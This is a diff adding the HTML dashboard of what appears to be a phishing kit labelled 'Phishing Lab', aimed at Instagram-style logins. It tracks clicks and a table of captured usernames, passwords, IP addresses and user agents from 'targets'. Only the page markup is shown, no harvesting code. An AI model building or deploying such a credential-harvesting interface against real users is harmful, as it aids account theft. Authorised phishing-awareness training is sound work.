@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard - Phishing Lab</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container dashboard-page">
+        <header>
+            <div class="logo">
+                <span class="logo-icon">📊</span>
+                <h1>Campaign Dashboard</h1>
+            </div>
+            <nav>
+                <a href="/" class="btn btn-outline">← Back to Home</a>
+            </nav>
+        </header>
+
+        <section class="campaign-overview" id="campaignOverview">
+            <div class="overview-card">
+                <div class="platform-badge" id="dashPlatform">Instagram</div>
+                <h2 id="dashCampaignId">Campaign: ---</h2>
+                <p class="text-muted" id="dashCreated">Created: ---</p>
+            </div>
+        </section>
+
+        <section class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-icon">👁️</div>
+                <div class="stat-info">
+                    <span class="stat-number" id="statClicks">0</span>
+                    <span class="stat-label">Total Clicks</span>
+                </div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon">🔑</div>
+                <div class="stat-info">
+                    <span class="stat-number" id="statCredentials">0</span>
+                    <span class="stat-label">Credentials Captured</span>
+                </div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon">🔗</div>
+                <div class="stat-info">
+                    <span class="stat-number" id="statLink">Link</span>
+                    <span class="stat-label" id="statLinkLabel">Click to copy</span>
+                </div>
+            </div>
+        </section>
+
+        <section class="credentials-section">
+            <div class="section-header">
+                <h2>Captured Credentials</h2>
+                <button onclick="refreshData()" class="btn btn-outline">🔄 Refresh</button>
+            </div>
+            <div class="table-container">
+                <table id="credsTable">
+                    <thead>
+                        <tr>
+                            <th>#</th>
+                            <th>Timestamp</th>
+                            <th>Username / Email</th>
+                            <th>Password</th>
+                            <th>IP Address</th>
+                            <th>User Agent</th>
+                        </tr>
+                    </thead>
+                    <tbody id="credsBody">
+                        <tr><td colspan="6" class="empty-state">No credentials captured yet. Waiting for targets...</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+        <div class="auto-refresh-bar">
+            <label>
+                <input type="checkbox" id="autoRefresh" checked onchange="toggleAutoRefresh()">
+                Auto-refresh every 5 seconds
+            </label>
+            <span class="text-muted" id="lastUpdate">Last updated: ---</span>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
